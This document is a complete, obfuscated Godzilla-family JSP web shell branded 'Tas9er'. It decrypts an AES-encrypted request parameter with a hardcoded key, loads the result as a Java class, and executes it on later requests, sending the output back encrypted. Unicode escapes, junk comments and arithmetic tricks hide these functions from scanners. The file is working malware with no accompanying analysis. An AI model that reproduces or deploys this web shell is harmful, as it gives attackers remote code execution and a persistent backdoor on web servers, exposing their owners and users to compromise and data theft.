Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_91lx = "3908ba8d9f067d73";
    String govsb_ORZe = "Tas9er";
    class govsb_C extends /*edusb_sbNloLh*/ClassLoader {
        public govsb_C(ClassLoader govsb_NXohdeBBPiNWX3) {
            super/*edusb_wp2MaUTq*/(govsb_NXohdeBBPiNWX3);
        }
        public Class govsb_OR(byte[] govsb_98I8Yv4t7d4Gs) {
            return super./*edusb_wLl*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_wLVvN3E5wmU*/(govsb_98I8Yv4t7d4Gs, 433174-433174, govsb_98I8Yv4t7d4Gs.length);
        }
    }
    public byte[] govsb_gTC(byte[] govsb_su6BcgNS5bF, boolean govsb_KOYbceFsHqEj) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_voGGwsrnk1*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_8y = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_5TzIvHI8*/("AES");
            govsb_8y.init(govsb_KOYbceFsHqEj?433174/433174:433174/433174+433174/433174,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_1IXGQpPnfdI7F*/SecretKeySpec/*edusb_yEF*/(govsb_91lx.getBytes(), "AES"));
            return govsb_8y.doFinal/*edusb_PrmB3pUCl*/(govsb_su6BcgNS5bF);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_y = java.util.Base64./*edusb_FoaSCOj1D*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_RxV4*/decode(request.getParameter(govsb_ORZe));
        govsb_y = govsb_gTC(govsb_y,false);
        if (session.getAttribute/*edusb_kDZPwGmzpavm*/("payload") == null) {
            session.setAttribute("payload", new govsb_C(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_XXOVLVKrc4*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_iwDP*/.govsb_OR(govsb_y));
        } else {
            request.setAttribute("parameters", govsb_y);
            java.io.ByteArrayOutputStream govsb_13cYhE1tmdg = new java.io./*edusb_evCU*/ByteArrayOutputStream();
            Object govsb_1Lc8vMgfv6uwXVB = /*edusb_HLcaNsrK4Ha*/((Class) session.getAttribute("payload"))./*edusb_RW*//*edusb_1DL39h*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_babyA9*/;
            govsb_1Lc8vMgfv6uwXVB.equals(govsb_13cYhE1tmdg);
            govsb_1Lc8vMgfv6uwXVB.equals(pageContext);
            response.getWriter().write("B004749058B4FEA49CDFFEA6D6DB6740".substring(433174-433174, 16));
            govsb_1Lc8vMgfv6uwXVB.toString();
            response.getWriter().write(java.util.Base64/*edusb_3807zdSkC*/.getEncoder()/*edusb_Ncn1kRM*/.encodeToString(govsb_gTC(govsb_13cYhE1tmdg.toByteArray(),true)));
            response.getWriter().write("B004749058B4FEA49CDFFEA6D6DB6740".substring(16));
        }
    } catch (Exception e) {
    }
%>